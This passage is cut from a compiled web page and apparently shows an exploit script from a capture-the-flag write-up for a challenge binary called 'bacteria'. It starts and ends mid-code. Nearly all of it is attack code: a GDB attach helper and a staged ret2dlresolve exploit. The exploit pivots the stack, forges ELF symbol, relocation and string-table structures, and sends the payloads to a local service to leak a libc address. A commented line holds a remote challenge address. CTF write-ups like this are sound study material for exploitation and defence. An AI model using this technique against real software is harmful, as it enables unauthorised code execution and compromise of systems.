punctuation\",children:\".\"}),\"read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\n'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tpid \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"''\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" ps\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\t\",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'/home/bacteria/bacteria'\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" i \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"and\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'timeout'\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"not\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\t\tpid \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'    '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'  '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"decode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\t\tlog\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Process pid: '\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"str\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"pid\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tcommand \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`'''\n`})]}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tb*0x401040\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tc\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tc\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tc\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tc\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`set $JMPREL = 0x400300\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`set $SYMTAB = 0x400290\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`set $STRTAB = 0x4002c0\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`set $reloc_arg = 632\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`x/3xg $JMPREL + $reloc_arg*24\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`x/3xg $SYMTAB + ( 0x0000027a00000007 \u003e\u003e 32 )*24\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`x/s $STRTAB + 0x3bc0\n`})}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:\"\t'''\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"with\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"open\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'/tmp/command.gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'wt'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"as\"}),\" f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t        f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"write\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"command\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tsubprocess\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"Popen\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'sudo'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'/usr/bin/x-terminal-emulator'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'--geometry'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'960x1080+960+0'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-e'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-p'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" pid\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-x'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'/tmp/command.gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"input\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# input() to make program wait with gdb\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" connect\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'127.0.0.1'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"9487\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# p = connect('34.81.158.137', 9487)\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# GDB()\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"############################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 1: Stack pivot ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"############################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x403e00\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"mov_rsi_rbp_read \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x401027\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# rip\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\"                 \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Just for padding so that we don\\u2019t need to sleep()\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"########################################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 2: Fake address and structure of Elf64_Sym ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"########################################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"SYMTAB \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400290\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Sym_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),` rw_section\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"symbol_number  \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"int\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Elf64_Sym_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" SYMTAB\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"24\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_name \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p32\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"15296\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"        \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change here\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p8\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x12\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_other \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p8\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_shndx \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p16\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_value \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# st_size is null already because the stack now contain all null byte\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# so we don\\u2019t need to write these variable, just need to pad full 0x10\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# bytes so that we don\\u2019t need to sleep()\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Sym_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" st_name \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" st_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" st_other \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" st_shndx \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),` st_value\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"#########################################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 3: Fake address and structure of Elf64_Rela ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"#########################################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"JMPREL \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400300\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Rela_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x40\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"reloc_arg \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"int\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Elf64_Rela_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" JMPREL\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"24\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"r_offset \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x50\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change here\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"r_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"symbol_number \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\u003c\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"32\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x7\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# r_addend is null and stack is null already so we don\\u2019t need to write this,\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# also because we run out of 0x10 bytes we can write\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Rela_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" r_offset \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),` r_info\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"#####################################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 4: Fake address and structure of STRTAB ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"#####################################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x4002c0\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x80\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_name \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" STRTAB_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),` STRTAB\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'b\"write\\\\x00\\\\x00\\\\x00\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"##########################################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 5. Conduct ret2dlresolve \u0026 Leak libc address ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"##########################################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Write Elf64_Sym structure\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Elf64_Rela_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, write and jump to Elf64_Rela address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` Elf64_Sym_struct\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Write Elf64_Rela structure\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"STRTAB_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"        \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, write and jump to STRTAB address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` Elf64_Rela_struct\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Write STRTAB structure\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x50\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, write and jump to ret2dlresolve address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` STRTAB_struct\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# print(reloc_arg)                       # Using GDB to check\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Conduct ret2dlresolve\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"dlresolver 